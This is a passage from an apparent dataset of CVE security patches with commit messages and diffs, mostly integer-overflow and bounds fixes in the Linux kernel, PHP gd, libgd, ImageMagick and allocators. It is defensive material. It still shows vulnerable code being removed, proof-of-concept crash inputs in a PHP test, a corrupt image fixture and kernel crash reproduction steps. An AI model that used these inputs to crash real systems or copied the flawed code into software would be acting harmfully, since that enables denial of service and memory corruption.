crop->width -1)) {\n-\t\tcrop->width = src->sx - crop->x + 1;\n+\t\/* check position in the src image *\/\n+\tif (crop->x < 0 || crop->x>=src->sx || crop->y<0 || crop->y>=src->sy) {\n+\t\treturn dst;\n+\t}\n+\n+\t\/* reduce size if needed *\/\n+\tif ((src->sx - crop->width) < crop->x) {\n+\t\tcrop->width = src->sx - crop->x;\n \t}\n-\tif (src->sy < (crop->y + crop->height -1)) {\n-\t\tcrop->height = src->sy - crop->y + 1;\n+\tif ((src->sy - crop->height) < crop->y) {\n+\t\tcrop->height = src->sy - crop->y;\n \t}\n+\n #if 0\n printf(\"rect->x: %i\\nrect->y: %i\\nrect->width: %i\\nrect->height: %i\\n\", crop->x, crop->y, crop->width, crop->height);\n #endif\n-\tif (dst == NULL) {\n-\t\treturn NULL;\n+\tint y = crop->y;\n+\tif (src->trueColor) {\n+\t\tunsigned int dst_y = 0;\n+\t\twhile (y < (crop->y + (crop->height - 1))) {\n+\t\t\t\/* TODO: replace 4 w\/byte per channel||pitch once available *\/\n+\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n+\t\t}\n \t} else {\n-\t\tint y = crop->y;\n-\t\tif (src->trueColor) {\n-\t\t\tunsigned int dst_y = 0;\n-\t\t\twhile (y < (crop->y + (crop->height - 1))) {\n-\t\t\t\t\/* TODO: replace 4 w\/byte per channel||pitch once available *\/\n-\t\t\t\tmemcpy(dst->tpixels[dst_y++], src->tpixels[y++] + crop->x, crop->width * 4);\n-\t\t\t}\n-\t\t} else {\n-\t\t\tint x;\n-\t\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n-\t\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n-\t\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n-\t\t\t\t}\n+\t\tint x;\n+\t\tfor (y = crop->y; y < (crop->y + (crop->height - 1)); y++) {\n+\t\t\tfor (x = crop->x; x < (crop->x + (crop->width - 1)); x++) {\n+\t\t\t\tdst->pixels[y - crop->y][x - crop->x] = src->pixels[y][x];\n \t\t\t}\n \t\t}\n-\t\treturn dst;\n \t}\n+\treturn dst;\n }\n \n \/**\ndiff --git a\/ext\/gd\/tests\/bug66356.phpt b\/ext\/gd\/tests\/bug66356.phpt\nindex f881494..2da91d6 100644\n--- a\/ext\/gd\/tests\/bug66356.phpt\n+++ b\/ext\/gd\/tests\/bug66356.phpt\n@@ -7,12 +7,27 @@ Bug #66356 (Heap Overflow Vulnerability in imagecrop())\n --FILE--\n <?php\n $img = imagecreatetruecolor(10, 10);\n-$img = imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10));\n+\n+\/\/ POC #1\n+var_dump(imagecrop($img, array(\"x\" => \"a\", \"y\" => 0, \"width\" => 10, \"height\" => 10)));\n+\n $arr = array(\"x\" => \"a\", \"y\" => \"12b\", \"width\" => 10, \"height\" => 10);\n-$img = imagecrop($img, $arr);\n+var_dump(imagecrop($img, $arr));\n print_r($arr);\n+\n+\/\/ POC #2\n+var_dump(imagecrop($img, array(\"x\" => 0, \"y\" => 0, \"width\" => -1, \"height\" => 10)));\n+\n+\/\/ POC #3\n+var_dump(imagecrop($img, array(\"x\" => -20, \"y\" => -20, \"width\" => 10, \"height\" => 10)));\n+\n+\/\/ POC #4\n+var_dump(imagecrop($img, array(\"x\" => 0x7fffff00, \"y\" => 0, \"width\" => 10, \"height\" => 10)));\n+\n ?>\n --EXPECTF--\n+resource(%d) of type (gd)\n+resource(%d) of type (gd)\n Array\n (\n     [x] => a\n@@ -20,3 +35,6 @@ Array\n     [width] => 10\n     [height] => 10\n )\n+bool(false)\n+resource(%d) of type (gd)\n+resource(%d) of type (gd)\n\\ No newline at end of file\n-- \n2.1.4\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-1593","CWE_ID":"189","category":"security","commit_id":"c78193e9c7bcbf25b8237ad0dec82f805c4ea69b","commit_message":"From c78193e9c7bcbf25b8237ad0dec82f805c4ea69b Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Mon, 18 Apr 2011 10:35:30 -0700\nSubject: next_pidmap: fix overflow condition\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nnext_pidmap() just quietly accepted whatever 'last' pid that was passed\nin, which is not all that safe when one of the users is \/proc.\n\nAdmittedly the proc code should do some sanity checking on the range\n(and that will be the next commit), but that doesn't mean that the\nhelper functions should just do that pidmap pointer arithmetic without\nchecking the range of its arguments.\n\nSo clamp 'last' to PID_MAX_LIMIT.  The fact that we then do \"last+1\"\ndoesn't really matter, the for-loop does check against the end of the\npidmap array properly (it's only the actual pointer arithmetic overflow\ncase we need to worry about, and going one bit beyond isn't going to\noverflow).\n\n[ Use PID_MAX_LIMIT rather than pid_max as per Eric Biederman ]\n\nReported-by: Tavis Ormandy <taviso@cmpxchg8b.com>\nAnalyzed-by: Robert \u015awi\u0119cki <robert@swiecki.net>\nCc: Eric W. Biederman <ebiederm@xmission.com>\nCc: Pavel Emelyanov <xemul@openvz.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n include\/linux\/pid.h | 2 +-\n kernel\/pid.c        | 5 ++++-\n 2 files changed, 5 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/pid.h b\/include\/linux\/pid.h\nindex 31afb7ecbe1f..cdced84261d7 100644\n--- a\/include\/linux\/pid.h\n+++ b\/include\/linux\/pid.h\n@@ -117,7 +117,7 @@ extern struct pid *find_vpid(int nr);\n  *\/\n extern struct pid *find_get_pid(int nr);\n extern struct pid *find_ge_pid(int nr, struct pid_namespace *);\n-int next_pidmap(struct pid_namespace *pid_ns, int last);\n+int next_pidmap(struct pid_namespace *pid_ns, unsigned int last);\n \n extern struct pid *alloc_pid(struct pid_namespace *ns);\n extern void free_pid(struct pid *pid);\ndiff --git a\/kernel\/pid.c b\/kernel\/pid.c\nindex 02f221274265..57a8346a270e 100644\n--- a\/kernel\/pid.c\n+++ b\/kernel\/pid.c\n@@ -217,11 +217,14 @@ static int alloc_pidmap(struct pid_namespace *pid_ns)\n \treturn -1;\n }\n \n-int next_pidmap(struct pid_namespace *pid_ns, int last)\n+int next_pidmap(struct pid_namespace *pid_ns, unsigned int last)\n {\n \tint offset;\n \tstruct pidmap *map, *end;\n \n+\tif (last >= PID_MAX_LIMIT)\n+\t\treturn -1;\n+\n \toffset = (last + 1) & BITS_PER_PAGE_MASK;\n \tmap = &pid_ns->pidmap[(last + 1)\/BITS_PER_PAGE];\n \tend = &pid_ns->pidmap[PIDMAP_ENTRIES];\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-7513","CWE_ID":"189","category":"security","commit_id":"a54fe0e8600eaf3dc6fe717d3c0398001507f723","commit_message":"From a54fe0e8600eaf3dc6fe717d3c0398001507f723 Mon Sep 17 00:00:00 2001\nFrom: cristy <urban-warrior@git.imagemagick.org>\nDate: Tue, 16 Dec 2014 12:24:08 +0000\nSubject: [PATCH]\n\n---\n magick\/cache.c | 27 ++-------------------------\n 1 file changed, 2 insertions(+), 25 deletions(-)\n\n","diff_code":"diff --git a\/magick\/cache.c b\/magick\/cache.c\nindex 70921c4fa5..369c52caff 100644\n--- a\/magick\/cache.c\n+++ b\/magick\/cache.c\n@@ -583,29 +583,6 @@ MagickExport void ClonePixelCacheMethods(Cache clone,const Cache cache)\n %\n *\/\n \n-static inline void CopyPixels(PixelPacket *destination,\n-  const PixelPacket *source,const MagickSizeType number_pixels)\n-{\n-#if !defined(MAGICKCORE_OPENMP_SUPPORT) || (MAGICKCORE_QUANTUM_DEPTH <= 8)\n-  (void) memcpy(destination,source,(size_t) number_pixels*sizeof(*source));\n-#else\n-  {\n-    register MagickOffsetType\n-      i;\n-\n-    if ((number_pixels*sizeof(*source)) < MagickMaxBufferExtent)\n-      {\n-        (void) memcpy(destination,source,(size_t) number_pixels*\n-          sizeof(*source));\n-        return;\n-      }\n-    #pragma omp parallel for\n-    for (i=0; i < (MagickOffsetType) number_pixels; i++)\n-      destination[i]=source[i];\n-  }\n-#endif\n-}\n-\n static inline MagickSizeType MagickMin(const MagickSizeType x,\n   const MagickSizeType y)\n {\n@@ -651,8 +628,8 @@ static MagickBooleanType ClonePixelCacheRepository(\n       \/*\n         Identical pixel cache morphology.\n       *\/\n-      CopyPixels(clone_info->pixels,cache_info->pixels,cache_info->columns*\n-        cache_info->rows);\n+      (void) memcpy(clone_info->pixels,cache_info->pixels,cache_info->columns*\n+        cache_info->rows*sizeof(*cache_info->pixels));\n       if ((cache_info->active_index_channel != MagickFalse) &&\n           (clone_info->active_index_channel != MagickFalse))\n         (void) memcpy(clone_info->indexes,cache_info->indexes,\n","owner":"ImageMagick","repo":"ImageMagick","source":"cve"},{"CVE_ID":"CVE-2010-4529","CWE_ID":"189","category":"security","commit_id":"fdac1e0697356ac212259f2147aa60c72e334861","commit_message":"From fdac1e0697356ac212259f2147aa60c72e334861 Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 22 Dec 2010 13:58:27 +0000\nSubject: irda: prevent integer underflow in IRLMP_ENUMDEVICES\n\nIf the user-provided len is less than the expected offset, the\nIRLMP_ENUMDEVICES getsockopt will do a copy_to_user() with a very large\nsize value.  While this isn't be a security issue on x86 because it will\nget caught by the access_ok() check, it may leak large amounts of kernel\nheap on other architectures.  In any event, this patch fixes it.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/irda\/af_irda.c | 18 +++++++++++-------\n 1 file changed, 11 insertions(+), 7 deletions(-)\n\n","diff_code":"diff --git a\/net\/irda\/af_irda.c b\/net\/irda\/af_irda.c\nindex 7f097989cde2..5007541b6478 100644\n--- a\/net\/irda\/af_irda.c\n+++ b\/net\/irda\/af_irda.c\n@@ -2281,6 +2281,16 @@ static int irda_getsockopt(struct socket *sock, int level, int optname,\n \n \tswitch (optname) {\n \tcase IRLMP_ENUMDEVICES:\n+\n+\t\t\/* Offset to first device entry *\/\n+\t\toffset = sizeof(struct irda_device_list) -\n+\t\t\tsizeof(struct irda_device_info);\n+\n+\t\tif (len < offset) {\n+\t\t\terr = -EINVAL;\n+\t\t\tgoto out;\n+\t\t}\n+\n \t\t\/* Ask lmp for the current discovery log *\/\n \t\tdiscoveries = irlmp_get_discoveries(&list.len, self->mask.word,\n \t\t\t\t\t\t    self->nslots);\n@@ -2291,15 +2301,9 @@ static int irda_getsockopt(struct socket *sock, int level, int optname,\n \t\t}\n \n \t\t\/* Write total list length back to client *\/\n-\t\tif (copy_to_user(optval, &list,\n-\t\t\t\t sizeof(struct irda_device_list) -\n-\t\t\t\t sizeof(struct irda_device_info)))\n+\t\tif (copy_to_user(optval, &list, offset))\n \t\t\terr = -EFAULT;\n \n-\t\t\/* Offset to first device entry *\/\n-\t\toffset = sizeof(struct irda_device_list) -\n-\t\t\tsizeof(struct irda_device_info);\n-\n \t\t\/* Copy the list itself - watch for overflow *\/\n \t\tif (list.len > 2048) {\n \t\t\terr = -EINVAL;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-3074","CWE_ID":"189","category":"security","commit_id":"2bb97f407c1145c850416a3bfbcc8cf124e68a19","commit_message":"From 2bb97f407c1145c850416a3bfbcc8cf124e68a19 Mon Sep 17 00:00:00 2001\nFrom: Mike Frysinger <vapier@gentoo.org>\nDate: Sat, 16 Apr 2016 03:51:22 -0400\nSubject: [PATCH] gd2: handle corrupt images better (CVE-2016-3074)\n\nMake sure we do some range checking on corrupted chunks.\n\nThanks to Hans Jerry Illikainen <hji@dyntopia.com> for indepth report\nand reproducer information.  Made for easy test case writing :).\n---\n .gitignore                     |   1 +\n src\/gd_gd2.c                   |   2 ++\n tests\/Makefile.am              |   3 ++-\n tests\/gd2\/gd2_read_corrupt.c   |  25 +++++++++++++++++++++++++\n tests\/gd2\/invalid_neg_size.gd2 | Bin 0 -> 1676 bytes\n 5 files changed, 30 insertions(+), 1 deletion(-)\n create mode 100644 tests\/gd2\/gd2_read_corrupt.c\n create mode 100644 tests\/gd2\/invalid_neg_size.gd2\n\n","diff_code":"diff --git a\/.gitignore b\/.gitignore\nindex a68f3b9c..35acd71d 100644\n--- a\/.gitignore\n+++ b\/.gitignore\n@@ -150,6 +150,7 @@ Makefile.in\n \/tests\/gd2\/gd2_im2im\n \/tests\/gd2\/gd2_null\n \/tests\/gd2\/gd2_read\n+\/tests\/gd2\/gd2_read_corrupt\n \/tests\/gdimagearc\/bug00079\n \/tests\/gdimageline\/gdimageline_aa\n \/tests\/gdimageline\/bug00072\ndiff --git a\/src\/gd_gd2.c b\/src\/gd_gd2.c\nindex 6f284610..a50b33d6 100644\n--- a\/src\/gd_gd2.c\n+++ b\/src\/gd_gd2.c\n@@ -165,6 +165,8 @@ _gd2GetHeader (gdIOCtxPtr in, int *sx, int *sy,\n \t\t\tif (gdGetInt (&cidx[i].size, in) != 1) {\n \t\t\t\tgoto fail2;\n \t\t\t};\n+\t\t\tif (cidx[i].offset < 0 || cidx[i].size < 0)\n+\t\t\t\tgoto fail2;\n \t\t};\n \t\t*chunkIdx = cidx;\n \t};\ndiff --git a\/tests\/Makefile.am b\/tests\/Makefile.am\nindex ed2c35b4..b582266b 100644\n--- a\/tests\/Makefile.am\n+++ b\/tests\/Makefile.am\n@@ -129,7 +129,8 @@ endif\n \n if HAVE_LIBZ\n check_PROGRAMS += \\\n-\tgd2\/gd2_null\n+\tgd2\/gd2_null \\\n+\tgd2\/gd2_read_corrupt\n endif\n \n if HAVE_LIBPNG\ndiff --git a\/tests\/gd2\/gd2_read_corrupt.c b\/tests\/gd2\/gd2_read_corrupt.c\nnew file mode 100644\nindex 00000000..11f6a67b\n--- \/dev\/null\n+++ b\/tests\/gd2\/gd2_read_corrupt.c\n@@ -0,0 +1,25 @@\n+\/* Just try to read the invalid gd2 image & not crash. *\/\n+#include \"gd.h\"\n+#include <stdio.h>\n+#include <stdlib.h>\n+#include \"gdtest.h\"\n+\n+int main()\n+{\n+\tgdImagePtr im;\n+\tFILE *fp;\n+\tchar path[1024];\n+\n+\t\/* Read the corrupt image. *\/\n+\tsprintf(path, \"%s\/gd2\/invalid_neg_size.gd2\", GDTEST_TOP_DIR);\n+\tfp = fopen(path, \"rb\");\n+\tif (!fp) {\n+\t\tprintf(\"failed, cannot open file\\n\");\n+\t\treturn 1;\n+\t}\n+\tim = gdImageCreateFromGd2(fp);\n+\tfclose(fp);\n+\n+\t\/* Should have failed & rejected it. *\/\n+\treturn im == NULL ? 0 : 1;\n+}\ndiff --git a\/tests\/gd2\/invalid_neg_size.gd2 b\/tests\/gd2\/invalid_neg_size.gd2\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..3075f15a81a5ac0312f1548ef7733726c58c1f24\nGIT binary patch\nliteral 1676\nzcmYdKF=Aj~VqgS92QbaVz`&x(z`&3Xq-XpG0w8-7jE2By2#o9ys9<DFVVM2jkq&_A\nzrDUq`{Y^Pj0@g4#f0QiA55HlZ@HF9tMV4@gn1|r?E8jjStJyO=Js<hwb(hMKkhS`+\nzIH#n4b81fOwK1Q}GC6xgli<E9^KAlt^6h-|{O7gG+mZ)9yjgNsGr@B1WVxObuQtrM\nz#=^yN#mUv!UZ(isn|)g<Gm@q5JT~X>)=nrYtl!eO@Y0j(uP24Oy8cV*JZTi%$LjUn\nzHzKcM%atz4N1|6Bc&yqQwj{71^7_XwahG!Za#qgRp0&AK_7P)ivKtpiqy+Qht#SF*\nzMaQJhn^t_9qk56qrqA%Mh<Mrlt=-}^_8Zw$*2~9UTQu|P_ebAXt^L@%Vt&w)*ca?Q\nzmoGA&ZC@r<dvR&!HA|J%GCJj_qO%-7e~P{{Z%T`}?Mk-4Qs-VbA2hzb+D@-d@!0Z+\nzna|e#ek}Mja+lhIXxR|+VBxjjJloZ}IRBU@_!{=-_#X*LR5`n@?<Lo!M7h*c?@zVv\nzYd=`G>{#vZ%zd@pEzz2O-%mf&R%I<VH&wT7kAHuuw|n=Ay_LQ$h6%e%zJGeR{l>8q\nzf?T2nbvg-FtoADt&xdhev;R0l>jm4q7qbJdANGtCPvX9R`uql)<-sap|IGrVrT6W5\nzXnv=f!*bd}GjY+2hGIKyAG$nqUSL?uGc}?vV9J_*x4-T7>?=Ea+<1Qdhx_^N-fMX)\nOZWwA+Ogk&gc>@5dGaWbp\n\nliteral 0\nHcmV?d00001\n\n","owner":"libgd","repo":"libgd","source":"cve"},{"CVE_ID":"CVE-2012-4565","CWE_ID":"189","category":"security","commit_id":"8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664","commit_message":"From 8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664 Mon Sep 17 00:00:00 2001\nFrom: Jesper Dangaard Brouer <brouer@redhat.com>\nDate: Wed, 31 Oct 2012 02:45:32 +0000\nSubject: [PATCH] net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm\ncan cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:\n do_div(t, ca->cnt_rtt);\nwhere ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:\n 1. Register tcp_illinois:\n     # sysctl -w net.ipv4.tcp_congestion_control=illinois\n 2. Monitor internal TCP information via command \"ss -i\"\n     # watch -d ss -i\n 3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait\nfor a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also\nperforms the same divide, but is guarded with a (ca->cnt_rtt > 0) at its\ncalling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() \/ get_info() is called without\nsocket lock.  Thus, eliminate any race condition on ca->cnt_rtt\nby using a local stack variable.  Simply reuse info.tcpv_rttcnt,\nas its already set to ca->cnt_rtt.\nFunction avg_delay() is not affected by this race condition, as\nits called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Jesper Dangaard Brouer <brouer@redhat.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Stephen Hemminger <shemminger@vyatta.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net\/ipv4\/tcp_illinois.c | 8 +++++---\n 1 file changed, 5 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/net\/ipv4\/tcp_illinois.c b\/net\/ipv4\/tcp_illinois.c\nindex 813b43a76fece..834857f3c8713 100644\n--- a\/net\/ipv4\/tcp_illinois.c\n+++ b\/net\/ipv4\/tcp_illinois.c\n@@ -313,11 +313,13 @@ static void tcp_illinois_info(struct sock *sk, u32 ext,\n \t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n \t\t\t.tcpv_minrtt = ca->base_rtt,\n \t\t};\n-\t\tu64 t = ca->sum_rtt;\n \n-\t\tdo_div(t, ca->cnt_rtt);\n-\t\tinfo.tcpv_rtt = t;\n+\t\tif (info.tcpv_rttcnt > 0) {\n+\t\t\tu64 t = ca->sum_rtt;\n \n+\t\t\tdo_div(t, info.tcpv_rttcnt);\n+\t\t\tinfo.tcpv_rtt = t;\n+\t\t}\n \t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n \t}\n }\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-2673","CWE_ID":"189","category":"security","commit_id":"6a93f8e5bcad22137f41b6c60a1c7384baaec2b3","commit_message":"From 6a93f8e5bcad22137f41b6c60a1c7384baaec2b3 Mon Sep 17 00:00:00 2001\nFrom: Ivan Maidanski <ivmai@mail.ru>\nDate: Thu, 15 Mar 2012 20:30:11 +0400\nSubject: [PATCH] Fix calloc-related code to prevent SIZE_MAX redefinition in\n sys headers\n\n* malloc.c: Include limits.h for SIZE_MAX.\n* malloc.c (SIZE_MAX, calloc): Define GC_SIZE_MAX instead of SIZE_MAX.\n---\n malloc.c | 10 +++++++---\n 1 file changed, 7 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/malloc.c b\/malloc.c\nindex 899d6ff1..cb49a5cf 100644\n--- a\/malloc.c\n+++ b\/malloc.c\n@@ -374,12 +374,16 @@ void * malloc(size_t lb)\n   }\n #endif \/* GC_LINUX_THREADS *\/\n \n-#ifndef SIZE_MAX\n-#define SIZE_MAX (~(size_t)0)\n+#include <limits.h>\n+#ifdef SIZE_MAX\n+# define GC_SIZE_MAX SIZE_MAX\n+#else\n+# define GC_SIZE_MAX (~(size_t)0)\n #endif\n+\n void * calloc(size_t n, size_t lb)\n {\n-    if (lb && n > SIZE_MAX \/ lb)\n+    if (lb && n > GC_SIZE_MAX \/ lb)\n       return NULL;\n #   if defined(GC_LINUX_THREADS) \/* && !defined(USE_PROC_FOR_LIBRARIES) *\/\n         \/* libpthread allocated some memory that is only pointed to by  *\/\n","owner":"ivmai","repo":"bdwgc","source":"cve"},{"CVE_ID":"CVE-2012-2675","CWE_ID":"189","category":"security","commit_id":"2965eca30c408c13473c4146a9d47d547d288db1","commit_message":"From 2965eca30c408c13473c4146a9d47d547d288db1 Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Sat, 14 Apr 2012 16:39:42 -0400\nSubject: [PATCH] Avoid overflowing allocation size in calloc()\n\n---\n nedmalloc.c | 8 ++++++--\n 1 file changed, 6 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/nedmalloc.c b\/nedmalloc.c\nindex 1b7922e..7170574 100644\n--- a\/nedmalloc.c\n+++ b\/nedmalloc.c\n@@ -2018,8 +2018,12 @@ NEDMALLOCNOALIASATTR NEDMALLOCPTRATTR void * nedpmalloc(nedpool *p, size_t size)\n }\n NEDMALLOCNOALIASATTR NEDMALLOCPTRATTR void * nedpcalloc(nedpool *p, size_t no, size_t size) THROWSPEC\n {\n-\tunsigned flags=NEDMALLOC_FORCERESERVE(p, 0, no*size);\n-\treturn nedpmalloc2(p, size*no, 0, M2_ZERO_MEMORY|flags);\n+\tsize_t bytes=no*size;\n+\t\/* Avoid multiplication overflow. *\/\n+\tif(size && no!=bytes\/size)\n+\t\treturn 0;\n+\tunsigned flags=NEDMALLOC_FORCERESERVE(p, 0, bytes);\n+\treturn nedpmalloc2(p, bytes, 0, M2_ZERO_MEMORY|flags);\n }\n NEDMALLOCNOALIASATTR NEDMALLOCPTRATTR void * nedprealloc(nedpool *p, void *mem, size_t size) THROWSPEC\n {\n","owner":"ned14","repo":"nedmalloc","source":"cve"},{"CVE_ID":"CVE-2012-2383","CWE_ID":"189","category":"security","commit_id":"ed8cd3b2cd61004cab85380c52b1817aca1ca49b","commit_message":"From ed8cd3b2cd61004cab85380c52b1817aca1ca49b Mon Sep 17 00:00:00 2001\nFrom: Xi Wang <xi.wang@gmail.com>\nDate: Mon, 23 Apr 2012 04:06:41 -0400\nSubject: drm\/i915: fix integer overflow in i915_gem_execbuffer2()\n\nOn 32-bit systems, a large args->buffer_count from userspace via ioctl\nmay overflow the allocation size, leading to out-of-bounds access.\n\nThis vulnerability was introduced in commit 8408c282 (\"drm\/i915:\nFirst try a normal large kmalloc for the temporary exec buffers\").\n\nSigned-off-by: Xi Wang <xi.wang@gmail.com>\nReviewed-by: Chris Wilson <chris@chris-wilson.co.uk>\nCc: stable@vger.kernel.org\nSigned-off-by: Daniel Vetter <daniel.vetter@ffwll.ch>\n---\n drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c b\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c\nindex f51a696486cb..7c50e58175c0 100644\n--- a\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c\n+++ b\/drivers\/gpu\/drm\/i915\/i915_gem_execbuffer.c\n@@ -1404,7 +1404,8 @@ i915_gem_execbuffer2(struct drm_device *dev, void *data,\n \tstruct drm_i915_gem_exec_object2 *exec2_list = NULL;\n \tint ret;\n \n-\tif (args->buffer_count < 1) {\n+\tif (args->buffer_count < 1 ||\n+\t    args->buffer_count > UINT_MAX \/ sizeof(*exec2_list)) {\n \t\tDRM_DEBUG(\"execbuf2 with %d buffers\\n\", args->buffer_count);\n \t\treturn -EINVAL;\n \t}\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2013-6378","CWE_ID":"189","category":"security","commit_id":"a497e47d4aec37aaf8f13509f3ef3d1f6a717d88","commit_message":"From a497e47d4aec37aaf8f13509f3ef3d1f6a717d88 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <dan.carpenter@oracle.com>\nDate: Wed, 30 Oct 2013 20:12:51 +0300\nSubject: libertas: potential oops in debugfs\n\nIf we do a zero size allocation then it will oops.  Also we can't be\nsure the user passes us a NUL terminated string so I've added a\nterminator.\n\nThis code can only be triggered by root.\n\nReported-by: Nico Golde <nico@ngolde.de>\nReported-by: Fabian Yamaguchi <fabs@goesec.de>\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nAcked-by: Dan Williams <dcbw@redhat.com>\nSigned-off-by: John W. Linville <linville@tuxdriver.com>\n---\n drivers\/net\/wireless\/libertas\/debugfs.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/net\/wireless\/libertas\/debugfs.c b\/drivers\/net\/wireless\/libertas\/debugfs.c\nindex 668dd27616a0..cc6a0a586f0b 100644\n--- a\/drivers\/net\/wireless\/libertas\/debugfs.c\n+++ b\/drivers\/net\/wireless\/libertas\/debugfs.c\n@@ -913,7 +913,10 @@ static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n \tchar *p2;\n \tstruct debug_data *d = f->private_data;\n \n-\tpdata = kmalloc(cnt, GFP_KERNEL);\n+\tif (cnt == 0)\n+\t\treturn 0;\n+\n+\tpdata = kmalloc(cnt + 1, GFP_KERNEL);\n \tif (pdata == NULL)\n \t\treturn 0;\n \n@@ -922,6 +925,7 @@ static ssize_t lbs_debugfs_write(struct file *f, const char __user *buf,\n \t\tkfree(pdata);\n \t\treturn 0;\n \t}\n+\tpdata[cnt] = '\\0';\n \n \tp0 = pdata;\n \tfor (i = 0; i < num_of_items; i++) {\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-7226","CWE_ID":"189","category":"security","commit_id":"2938329ce19cb8c4197dec146c3ec887c6f61d01","commit_message":"From 2938329ce19cb8c4197dec146c3ec887c6f61d01 Mon Sep 17 00:00:00 2001\nFrom: Xinchen Hui <laruence@php.net>\nDate: Fri, 27 Dec 2013 14:04:59 +0800\nSubject: [PATCH] Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop())\n\nAnd also fixed the bug: arguments are altered after some calls\n---\n NEWS                       |   1 +\n ext\/gd\/gd.c                | 181 ++++++++++++++++++++++++++++++-------\n ext\/gd\/tests\/bug66356.phpt |  22 +++++\n main\/php_version.h         |   6 +-\n 4 files changed, 173 insertions(+), 37 deletions(-)\n create mode 100644 ext\/gd\/tests\/bug66356.phpt\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex eecd4e800284..86eeb7cea9fe 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -29,6 +29,7 @@ PHP                                                                        NEWS\n   . Fixed bug #66229 (128.0.0.0\/16 isn't reserved any longer). (Adam)\n \n - GD:\n+  . Fixed bug #66356 (Heap Overflow Vulnerability in imagecrop()). (Laruence)\n   . Fixed bug #64405 (Use freetype-config for determining freetype2 dir(s)).\n     (Adam)\n     \ndiff --git a\/ext\/gd\/gd.c b\/ext\/gd\/gd.c\nindex fb258214a153..49970c168838 100644\n--- a\/ext\/gd\/gd.c\n+++ b\/ext\/gd\/gd.c\n@@ -1538,9 +1538,15 @@ PHP_FUNCTION(imagesetstyle)\n \t\t\tbreak;\n \t\t}\n \n-\t\tconvert_to_long_ex(item);\n-\n-\t\tstylearr[index++] = Z_LVAL_PP(item);\n+\t\tif (Z_TYPE_PP(item) != IS_LONG) {\n+\t\t\tzval lval;\n+\t\t\tlval = **item;\n+\t\t\tzval_copy_ctor(&lval);\n+\t\t\tconvert_to_long(&lval);\n+\t\t\tstylearr[index++] = Z_LVAL(lval);\n+\t\t} else {\n+\t\t\tstylearr[index++] = Z_LVAL_PP(item);\n+\t\t}\n \t}\n \n \tgdImageSetStyle(im, stylearr, index);\n@@ -3346,14 +3352,26 @@ static void php_imagepolygon(INTERNAL_FUNCTION_PARAMETERS, int filled)\n \n \tfor (i = 0; i < npoints; i++) {\n \t\tif (zend_hash_index_find(Z_ARRVAL_P(POINTS), (i * 2), (void **) &var) == SUCCESS) {\n-\t\t\tSEPARATE_ZVAL((var));\n-\t\t\tconvert_to_long(*var);\n-\t\t\tpoints[i].x = Z_LVAL_PP(var);\n+\t\t\tif (Z_TYPE_PP(var) != IS_LONG) {\n+\t\t\t\tzval lval;\n+\t\t\t\tlval = **var;\n+\t\t\t\tzval_copy_ctor(&lval);\n+\t\t\t\tconvert_to_long(&lval);\n+\t\t\t\tpoints[i].x = Z_LVAL(lval);\n+\t\t\t} else {\n+\t\t\t\tpoints[i].x = 